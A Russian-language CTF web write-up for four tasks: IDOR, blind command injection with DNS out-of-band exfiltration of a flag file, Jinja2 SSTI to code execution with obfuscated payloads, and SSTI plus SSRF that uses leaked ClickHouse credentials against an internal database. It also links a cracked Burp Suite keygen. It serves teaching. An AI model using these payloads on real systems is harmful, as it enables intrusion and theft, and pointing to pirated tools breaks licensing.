# table of content
1. [info](#info)
2. [writeups](#writeups)
	1. [baro](#baro)
	2. [chigiri](#chigiri)
	3. [bachira](#bachira)
	4. [kunigami](#kunigami)
	5. [kurona](#kurona)
3. [afterword](#afterword)
# info
Базовый сетап для решения задач по вебу:
- Linux на виртуальной машине
- Burp Suite Pro (в Community-версии много неприятных ограничений), версию с кейгеном можно найти тут: [@burpsuite](https://t.me/burpsuite)

С чего начинать:
- [Portswigger's Web Security Academy](https://portswigger.net/web-security)
- [Раздел по вебу на Hacktricks](https://book.hacktricks.xyz/pentesting-web)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Python (субъективно, но на нем проще всего писать скрипты для автоматизации)

Полезно в целом:
- Почитать как раньше/сейчас делали/делают/работали/работают веб-приложения - старые знания чуть менее, но тоже важны, потому что могут попадаться цели, которые были разработаны когда мы все под столами бегали
- Пытаясь что-то сломать, вы должны будете погружаться в стек технологий, которые используется в этом приложении - без этого в реальном мире очень сложно находить уязвимости
# writeups
## baro
### tl;dr
IDOR on /api/products/\<id\>
### solution
Как и показали на крайне неудачном из-за выделенного времени сеансе разбора, фронтенд делает запросы к бэкенду для получения списка товаров, которые необходимо отрисовать (в браузере: инструменты разработчика, вкладка сеть)

Есть два API-эндпоинта ("ручки"):
```bash
❯ curl --silent -X GET 'https://baro.uctf.xotohop.tech/api/products' | jq # получает список id, которые нужно отрисовать
[
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8
]

❯ curl --silent -X GET 'https://baro.uctf.xotohop.tech/api/product/1' | jq # напрямую обращается по списку полученных id
{
  "description": "Stealthy and comfortable",
  "image": "black_hoodie.jpg",
  "name": "Black Hoodie",
  "price": 39.99
}
```

Но что, если ассортимент не заканчивается на 8 товарах? Попробуем перебрать id в пределах 100:
```python
import requests as r

for i in range(1, 101):
    response = r.get(f'https://baro.uctf.xotohop.tech/api/product/{i}')
    if response.status_code != 404:
	    print(f'{i}: {response.text}')
```

Вывод:
```
1: {"description":"Stealthy and comfortable","image":"black_hoodie.jpg","name":"Black Hoodie","price":39.99}
2: {"description":"Perfect for nighttime operations","image":"dark_sunglasses.jpg","name":"Dark Sunglasses","price":29.99}
3: {"description":"Silent steps guaranteed","image":"shadow_boots.jpg","name":"Shadow Boots","price":79.99}
4: {"description":"256-bit encryption for your data","image":"encrypted_usb.jpg","name":"Encrypted USB","price":59.99}
5: {"description":"Invisible to metal detectors","image":"stealth_backpack.jpg","name":"Stealth Backpack","price":89.99}
6: {"description":"Enhanced grip and protection","image":"tactical_gloves.jpg","name":"Tactical Gloves","price":34.99}
7: {"description":"See in complete darkness","image":"night_vision_goggles.jpg","name":"Night Vision Goggles","price":299.99}
8: {"description":"There's usually one to three \u5df4...","image":"strange_eye.jpg","name":"Someone's strange eye","price":999999.99}
42: {"description":"UCTF{6a1ciBfvyWkjpdtSncYV9gZAcQJDYp5I}","image":"flag.jpg","name":"Hidden product","price":1337.0}
```
## chigiri
### tl;dr
Blind OS command injection with out-of-band data exfiltration
### solution
Тут у нас инструмент, который выдает IP-адрес введенного домена, то есть делает DNS-запрос - отсюда и смысл задания: понять, какие запросы делаются для получения IP-адреса домена, как их "отловить" и что можно с этим сделать

Сразу оговоримся, что сервер на Linux (в реальности пришлось бы еще пытаться понять, это Windows или Linux - про это уже читайте сами)

И так, вводим `vk.com`:
```
93.186.225.194
87.240.132.72
87.240.129.133
87.240.132.67
87.240.132.78
87.240.137.164
```

Теперь вводим несуществующий домен, например, `uneconctf.ru`, сервер отвечает, что случилась какая-то ошибка:
```
Some error occured t_t
```

DNS-lookup могут делать по-разному, то есть и чисто кодом, используя как стандартные/внешние библиотеки/классы (то есть используя функционал самого ЯП) для работы с сетью, так и какими-либо готовыми утилитами ОС - пишут код, который выполняет команду ОС и увеличивают риски быть похаканными в тысячу раз (никогда так не делайте, можно только для автоматизации каких-то локальных задач, в крайнем случае можно без приема в эти функцию выполнения команд ОС каких-либо вводимых данных). Теперь попробуем выйти за пределы исходной команды и подкинуть серверу что-то еще, то есть ставим домен и добавляем в конец `;cat /flag.txt` (с разделителем `;` вторая команда выполнится в любом случае) - команда на сервере должна выглядеть примерно так: `some_lookup_tool vk.com;cat /flag.txt`, пробуем еще `&&` (вторая команда только в случае успешного завершения первой - exit-код 0) и `||` (вторая команда только в случае завершения первой с ненулевым exit-кодом):
```
vk.com;cat /flag.txt

vk.com&&cat /flag.txt

uneconctf.ru||cat /flag.txt
```

Везде получаем тот же ответ, что и на запрос без инъекции - запрос был обработан, значит, либо часть запроса обрезается, либо не показывается результат второй команды. Если мы не видим или частично видим ответ, значит, надо проверять по другому - по времени ответа или по наличию/отсутствию ошибок, в этом нам должна помочь утилита `sleep`:
```bash
vk.com;sleep 5

vk.com&&sleep 5

uneconctf.ru||sleep 5
```

Ничего не изменилось, значит, все-таки инъекция вырезается (не допускается до выполнения на сервере), либо на сервере нет никакой из этих утилит, но у нас остается еще пространство для попыток: попробовать подставить результат выполнения какой либо команды в домен, в этом нам могут помочь такие конструкции:
```bash
❯ echo `echo test`.vk.com
test.vk.com
❯ echo $(echo test).vk.com
test.vk.com
```

Т.к. мы не видим в ответе, какой домен мы ввели, сразу попробуем сделать `sleep` (в будущем столкнетесь с ситуациями, когда нужно будет писать заведомо кривые команды, чтобы получить ошибку - иногда приходится генерить ошибку в случае успеха и таким образом понимать, что наша команда выполнилась) и замерить примерное время (в бурпе показывается, сколько мс занял запрос, в инструментах разработчика в браузерах тоже есть):
```
`sleep 5`.vk.com

$(sleep 5).vk.com
```

Оба ответили через ~5 секунд, для уверенности ставим все 20 секунд - мы заинъектили команду ОС, но есть плохая новость - мы не видим результат выполнения. Почитав про слепые инъекции команд ОС вы быстро дойдете, что в нашем случае нужно поймать запросы, которые делаются с сервера приложения. Для этого можно использовать сервис [interact.sh](https://app.interactsh.com) (в бурп про есть встроенный генератор доменов для ловли out-of-band взаимодействия, называется collaborator)

Заходим на interact.sh, получаем домен, например, `ldqxylxjewhzremushatgey3eqkuza38b.oast.fun` и пробуем теперь получить его адрес:
```
206.189.156.69
```

На interact.sh видим, что кто-то постучался на домен и сервис ответил:
```
;; opcode: QUERY, status: NOERROR, id: 32284
;; flags: qr aa cd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2

;; QUESTION SECTION:
;ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	IN	 A

;; ANSWER SECTION:
ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	A	206.189.156.69

;; AUTHORITY SECTION:
ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	NS	ns1.oast.fun.
ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	NS	ns2.oast.fun.

;; ADDITIONAL SECTION:
ns1.oast.fun.	3600	IN	A	206.189.156.69
ns2.oast.fun.	3600	IN	A	206.189.156.69
```

Теперь пробуем вставить наш заветный `cat /flag.txt`:
```
`cat /flag.txt`.ldqxylxjewhzremushatgey3eqkuza38b.oast.fun
```

Смотрим на interact.sh:
```
;; opcode: QUERY, status: NOERROR, id: 18878
;; flags: qr aa cd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2

;; QUESTION SECTION:
;UCTF{jpMTHCIgbJY1FH6UI8heZSX1ZNxrW7M2}.ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	IN	 A

;; ANSWER SECTION:
UCTF{jpMTHCIgbJY1FH6UI8heZSX1ZNxrW7M2}.ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	A	206.189.156.69

;; AUTHORITY SECTION:
UCTF{jpMTHCIgbJY1FH6UI8heZSX1ZNxrW7M2}.ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	NS	ns1.oast.fun.
UCTF{jpMTHCIgbJY1FH6UI8heZSX1ZNxrW7M2}.ldqxylxjewhzremushatgey3eqkuza38b.oast.fun.	3600	IN	NS	ns2.oast.fun.

;; ADDITIONAL SECTION:
ns1.oast.fun.	3600	IN	A	206.189.156.69
ns2.oast.fun.	3600	IN	A	206.189.156.69
```
## bachira
### tl;dr
RCE over Jinja2 SSTI
### solution
Да, до того, что это SSTI, а шаблонизатор Jinja2 или Twig, еще надо дойти, но с опытом вы начнете автоматом пихать по своему (или чужому) словарю инъекций все, что вы знаете и не знаете, про SSTI вам чуть чуть рассказали, поэтому тут сразу приступим к самим инъекциям

Понимание того, что это [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md) или [Twig](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md):
```
{{ 7*9 }}
{{ 7*'k' }}
{{dump(app)}} # проверяем, что это может быть Twig
{{ config.items() }} # проверяем, что это может быть Jinja2 - радуемся
```

Ответ на `{{config.items()}}`:
```python
dict_items([('DEBUG', True), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', 'hohohaha'), ('SECRET_KEY_FALLBACKS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('TRUSTED_HOSTS', None), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_PARTITIONED', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('MAX_FORM_MEMORY_SIZE', 500000), ('MAX_FORM_PARTS', 1000), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('PROVIDE_AUTOMATIC_OPTIONS', True)])
```

Сразу идем искать как сделать RCE:
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Очень советую выяснить, как это вообще работает, поможет в будущем делать очень красивые инъекции, например, такое:
```python
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Ответ:
```
uid=1000(www) gid=1000(www) groups=1000(www)
```

Читаем `/etc/hosts`:
```python
{{ cycler.__init__.__globals__.os.popen('cat /etc/hosts').read() }}
```

Ответ:
```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.21.0.2	ec92e9e3575e
```

Так нет информации, где лежит флаг, придется его искать. Но мы знаем формат флага: ищем по началу флага - `UCTF`, в этом нам поможет какая-нибудь утилита, которая позволяет искать файлы по их содержимому, сразу можем проверить, что нам предлагает сервер приложения (можно поиграть еще в других местах, но это самые дефолтные директории):
```python
{{ cycler.__init__.__globals__.os.popen('ls /bin').read() }}
{{ cycler.__init__.__globals__.os.popen('ls /usr/bin').read() }}
```

Ответы довольные емкие, сами кайфаните. Еще есть такой ресурс, как [gtfobins](https://gtfobins.github.io/) - посмотрите его, в будущем не раз выручит

Ищем какая утилита позволит нам искать файл по его содержимому, доходим до `grep`, читаем что он может нам дать, собираем запрос, в котором греп рекурсивно ищет по вхождению строки в файл, крайне не рекомендую делать на весь корень сразу, это может уронить сервер (также если вы исследуя сервер выяснили, что есть точно огромные директории, их тоже нужно трогать осторожно). Лучше спокойно идти по директориям, для начала можно проверить, какая команда точно отработает, мы знаем, что в `/etc/hosts` точно есть строка `172`:
```python
{{ cycler.__init__.__globals__.os.popen('grep -R "172" /etc').read() }}
```

Ответ:
```
/etc/hosts:172.21.0.2	ec92e9e3575e
```

Теперь ищем флаг (в директориях, где валяются бинари, смысла искать обычно нет, это делается только если в "обычных местах ничего не нашлось"):
```python
{{ cycler.__init__.__globals__.os.popen('grep -R "UCTF" /etc').read() }}
{{ cycler.__init__.__globals__.os.popen('grep -R "UCTF" /var').read() }}
{{ cycler.__init__.__globals__.os.popen('grep -R "UCTF" /tmp').read() }}
{{ cycler.__init__.__globals__.os.popen('grep -R "UCTF" /usr').read() }}
```

Ответ с флагом:
```
/usr/share/dict/1QdMO8Et:UCTF{x5z9ZXBm0Z4WwIa9pV0oncQSFzp5Iobi}
```
## kunigami
### tl;dr
Jinja2 SSTI + SSRF
### solution
Регаемся, логинимся, смотрим частично реализованный функционал этого великолепного куска говна, как и в случае с `bachira`, доходим до SSTI, смотрим `config.items()` - громко и четко отвечаем "нет"

Пробуем выполнить команду ОС - не получится, потому что приложение деплоится на базе дистролесс образа и в нем ничего, кроме питона и openssl, нет (кому интересно, почитайте тоже, что такое distroless) - то есть там просто нечего исполнять, кроме питон кода (а питон код в свою очередь не может какой-нибудь `os.popen()` сделать, потому что там нет шелла никакого). Впрочем, можете потыкать сами, пример такого образа: `docker run -it --rm gcr.io/distroless/python3-debian12`

Тогда придется обходиться тем, что нам дает питон - начинаем с исследования окружения и самого сервера (иногда список доступных модулей другой, иногда их там вообще нет, тут тоже придется много чего изучать):
```python
{{ cycler.__init__.__globals__.os.environ }} # переменные окружения
{{ cycler.__init__.__globals__.os.getcwd() }} # рабочая директория приложения
{{ cycler.__init__.__globals__.os.listdir('/') }} # файловая стркутура сервера, дальше идете смотреть, что там есть интересного
{{ cycler.__init__.__globals__.os.listdir('/usr/bin') }} # узнаем, что питон 3.11 (может помочь при чтении документации), можно это узнать более изящно - выполнить питоновый код, можете попробовать исполнить, мне лень таким заниматься без острой необходимости
{{ cycler.__init__.__globals__.os.listdir('/venv/bin') }} # тут тоже есть питончиковые бинари (если есть виртуальное окружение питона, то, скорее всего, в его контексте и работает приложение)
{{ cycler.__init__.__globals__.os.read(cycler.__init__.__globals__.os.open("/etc/hosts", 0), 1000) }} # читаем файлы
```

Документация библиотеки `os` нужной версии - [docs.python.org/3.11/library/os](https://docs.python.org/3.11/library/os.html)

Ответ на `{{ cycler.__init__.__globals__.os.environ }}`:
```
environ({'PATH': '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': '8681d6734908', 'CLICKHOUSE_USER': 'app_user', 'CLICKHOUSE_PASSWORD': 'N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM', 'SSL_CERT_FILE': '/etc/ssl/certs/ca-certificates.crt', 'LANG': 'C.UTF-8', 'HOME': '/home/nonroot', 'WERKZEUG_SERVER_FD': '3'})
```

Видим утечку кредов в переменных окружения `CLICKHOUSE_USER` и `CLICKHOUSE_PASSWORD`, значит, где-то рядом должен быть хост с БД (иногда прямо на одном хосте поднимают, но в реальной жизни они могут даже в разных подсетях). Кто-то уже на этом моменте пойдет читать про Clickhouse, но без возможности делать запросы не стоит распыляться на лишние движения в условиях соревнований с временным ограничением

На `{{ cycler.__init__.__globals__.os.read(cycler.__init__.__globals__.os.open("/etc/hosts", 0), 1000) }}`, узнаем, что у нас адрес `172.20.0.2`:
```
b'127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n172.20.0.2\t8681d6734908\n'
```

На этом моменте базовую информацию мы собрали, большего эта уязвимость базово нам не даст, раз в таске есть утечка кредов, то эти креды где-то должны быть применены, и тут мы доходим до функциональности загрузки аватарок по ссылке, тут все просто, вводим URL (например, `https://google.com`), получаем ответ:
```html
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="https://www.google.com/">here</A>.
</BODY></HTML>
```

Проверяем, делает ли эта штука запросы к внутренней сетке - всегда пробуем и https (`https://172.20.0.2`), и http (`http://172.20.0.2`), по https получаем в лицо следующее:
```
Error occurred while fetching avatar: HTTPSConnectionPool(host='172.20.0.2', port=443): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7fa6ca4f2010>: Failed to establish a new connection: [Errno 111] Connection refused'))
```

И для http:
```
Error occurred while fetching avatar: HTTPConnectionPool(host='172.20.0.2', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fa6ca50b050>: Failed to establish a new connection: [Errno 111] Connection refused'))
```

Все, запросы делаются, теперь нам нужно узнать, где крутится Clickhouse - тут есть два пути:
1) Все адреса, к которым ходили из сервера, могут быть в ARP-кэше (что это такое почитаете тоже сами, это я бы назвал более высоким уровнем, т.к. тут надо сети чуть-чуть знать)
2) Просто перебрать адреса по всей сетке `172.20.0.1/24` (как ловить/смотреть запросы и потом их автоматизировать мы показали)

И так, читаем ARP-кэш:
```python
{{ cycler.__init__.__globals__.os.read(cycler.__init__.__globals__.os.open("/etc/hosts", 0), 1000) }}
```

Ответ:
```
b'IP address HW type Flags HW address Mask Device\n172.20.0.5 0x1 0x0 00:00:00:00:00:00 * eth0\n172.20.0.1 0x1 0x2 02:42:f3:6c:b7:1f * eth0\n172.20.0.7 0x1 0x2 02:42:ac:14:00:07 * eth0\n'
```

Видим, что на них что-то может быть:
```
172.20.0.1
172.20.0.5
172.20.0.7
```

Читаем про Clickhouse, узнаем, что у него на `8123` порту по дефолту HTTP-интерфейс (можно прям загуглить `access to clickhouse over http`): https://clickhouse.com/docs/en/interfaces/http, по очереди перебираем хосты

Для второго варианта (считаю его более православным) нужно заранее узнать, на какой/какие порты стучать, только прочитайте про питониевый модуль `requests`:
```python
import requests as r

for scheme in ['http', 'https']:
	for host in range(1, 256):
		url = 'https://kunigami.uctf.xotohop.tech/avatar' # ручка, смотрим в браузере/бурпе
		headers = {'Cookie': 'session=eyJ1c2VybmFtZSI6IjUifQ.Z0tdQw.1awqk_iAMjke-YwBwTdsIduWgBY'} # наш сессионный токен, смотрим в браузере/бурпе
		data = {'url': f'{scheme}://172.20.0.{host}:8123'} # тело POST запроса, смотрим в браузере/бурпе
		response = r.post(url, data=data, headers=headers, timeout=5) # таймаут ставим потому что даже "на глаз" при запросах из браузера приложение долго отвечает
		if 'Error occurred while fetching avatar' not in response.text:
			print(f'{data}: {response.text}')
```

Получаем:
```
{'url': 'http://172.20.0.7:8123'}
```

Сразу пробуем получить версию БД - `http://172.20.0.7:8123?query=SELECT+version()`, получаем ошибку (тут даже версия есть):
```
Code: 516. DB::Exception: default: Authentication failed: password is incorrect, or there is no user with such name.

If you have installed ClickHouse and forgot password you can reset it in the configuration file.
The password for default user is typically located at /etc/clickhouse-server/users.d/default-password.xml
and deleting this file will reset the password.
See also /etc/clickhouse-server/users.xml on the server where ClickHouse is installed.

. (AUTHENTICATION_FAILED) (version 24.8.8.17 (official build))
```

Говорит, надо аутхаться, а креды у нас уже есть, в той же страничке про http-интерфейс клика есть и про аутентификацию, у нас два варианта:
```
http://app_user:N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM@172.20.0.7:8123?query=select+version()
http://172.20.0.7:8123?user=app_user&password=N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM&query=select+version()
```

Делайте как удобнее, мне нравится второй вариант, отвечаем без ошибок:
```
24.8.8.17
```

Теперь пришло время изучать, что же там внутри (сначала опять придется читать, теперь про синтаксис клика)

Смотрим список доступных нашему кровью и потом добытому пользователю:
```
http://172.20.0.7:8123?user=app_user&password=N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM&query=show+databases
```

Ответ:
```
secret
```

Смотрим список таблиц в БД `secret`:
```
http://172.20.0.7:8123?user=app_user&password=N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM&query=show+tables+from+secret
```

Ответ:
```
data
```

Читаем все, что есть в этой таблице:
```
http://172.20.0.7:8123?user=app_user&password=N7p3uK1w1ZNYNKdg9joKdptILCnjFSCM&query=select+*+from+secret.data
```

Получаем флаг:
```
UCTF{qUN2SQEAfaulmPUe2FLNGH4FjlJHf5Al}
```
## kurona
Тут без пока райтапа, только скажу, что там заложена уязвимость SQL-инъекции (мб потом залью, а так это таска для желающих проверить себя)
# afterword
Делая эти задачи, я пытался воссоздать более-менее реальные кейсы приложений, поэтому в описаниях не было подсказок (с каждым годом все сложнее писать такой уязвимый код, будущее за уязвимостями в логике, может, в след раз принесу что-то прикольное), но по факту хоть как-то близок к реальности только `kunigami`

Задачи были рассчитаны для ребят разных курсов, чтобы новичкам не было слишком тяжело, а опытным - не так скучно. Так что никогда не расстраивайтесь, когда какой-либо таск не получается решить - это ваш шанс узнать что-то новое

Скринов нет, чтобы вам было интереснее протыкать самим
